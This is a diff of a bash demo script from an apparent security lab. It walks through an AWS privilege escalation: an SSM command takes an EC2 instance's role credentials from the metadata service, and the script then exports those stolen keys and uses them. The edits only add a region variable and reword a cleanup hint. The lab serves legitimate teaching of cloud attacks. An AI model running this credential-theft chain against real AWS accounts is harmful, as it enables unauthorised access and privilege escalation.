@@ -132,6 +132,7 @@ setup_demo_restriction_trap "$SCRIPT_DIR/scenario.yaml"
 echo -e "${YELLOW}Step 2: Configuring AWS CLI with starting user credentials${NC}"
 use_starting_creds
 export AWS_REGION=$AWS_REGION
+export AWS_DEFAULT_REGION="$AWS_REGION"
 
 echo "Using region: $AWS_REGION"
 
@@ -158,6 +159,7 @@ echo -e "${GREEN}✓ Retrieved account ID${NC}\n"
 echo -e "${YELLOW}Step 4: Verifying we don't have bucket access yet${NC}"
 use_starting_creds
 export AWS_REGION=$AWS_REGION
+export AWS_DEFAULT_REGION="$AWS_REGION"
 echo "Attempting to access bucket: $TARGET_BUCKET"
 show_cmd "Attacker" "aws s3 ls s3://$TARGET_BUCKET --region $AWS_REGION"
 if aws s3 ls s3://$TARGET_BUCKET --region $AWS_REGION &> /dev/null; then
@@ -171,6 +173,7 @@ echo ""
 echo -e "${YELLOW}Step 5: Discovering target EC2 instance${NC}"
 use_readonly_creds
 export AWS_REGION=$AWS_REGION
+export AWS_DEFAULT_REGION="$AWS_REGION"
 echo "Listing EC2 instances with their attached IAM roles..."
 show_cmd "ReadOnly" "aws ec2 describe-instances --region $AWS_REGION --instance-ids $INSTANCE_ID --query 'Reservations[0].Instances[0].[InstanceId,State.Name,IamInstanceProfile.Arn]' --output text"
 INSTANCE_INFO=$(aws ec2 describe-instances \
@@ -194,6 +197,7 @@ echo ""
 echo -e "${YELLOW}Step 6: Checking if instance is ready for SSM commands${NC}"
 use_readonly_creds
 export AWS_REGION=$AWS_REGION
+export AWS_DEFAULT_REGION="$AWS_REGION"
 echo "Verifying SSM agent is running on the instance..."
 
 # Allow up to 3 minutes for the SSM agent to register — freshly-deployed instances
@@ -234,6 +238,7 @@ echo ""
 echo -e "${YELLOW}Step 7: Sending SSM command to extract instance role credentials${NC}"
 use_starting_creds
 export AWS_REGION=$AWS_REGION
+export AWS_DEFAULT_REGION="$AWS_REGION"
 echo "This is the privilege escalation vector..."
 echo "Executing command to retrieve credentials from instance metadata service"
 
@@ -258,6 +263,7 @@ echo -e "${GREEN}✓ SSM command sent successfully${NC}\n"
 echo -e "${YELLOW}Step 8: Waiting for command to complete${NC}"
 use_readonly_creds
 export AWS_REGION=$AWS_REGION
+export AWS_DEFAULT_REGION="$AWS_REGION"
 echo "This may take 15-30 seconds..."
 
 # Wait 15 seconds for IAM propagation standard
@@ -302,6 +308,7 @@ echo ""
 echo -e "${YELLOW}Step 9: Retrieving command output with extracted credentials${NC}"
 use_readonly_creds
 export AWS_REGION=$AWS_REGION
+export AWS_DEFAULT_REGION="$AWS_REGION"
 
 show_cmd "ReadOnly" "aws ssm list-command-invocations --region $AWS_REGION --command-id "$COMMAND_ID" --details --query 'CommandInvocations[0].CommandPlugins[0].Output' --output text"
 CREDS_JSON=$(aws ssm list-command-invocations \
@@ -339,6 +346,7 @@ export AWS_SECRET_ACCESS_KEY="$EXTRACTED_SECRET_KEY"
 export AWS_SESSION_TOKEN="$EXTRACTED_SESSION_TOKEN"
 # Keep region consistent
 export AWS_REGION=$AWS_REGION
+export AWS_DEFAULT_REGION="$AWS_REGION"
 
 # Verify new identity
 show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
@@ -419,7 +427,7 @@ echo "- T1552.005: Unsecured Credentials: Cloud Instance Metadata API"
 
 echo -e "\n${YELLOW}Note: SSM command history is automatically cleaned up by AWS after 30 days${NC}"
 echo -e "${YELLOW}To clean up immediately (optional):${NC}"
-echo "  ./cleanup_attack.sh or use the plabs TUI/CLI"
+echo "  run plabs cleanup or use the plabs TUI/CLI"
 echo ""
 
 # Mark demo as active for plabs tracking
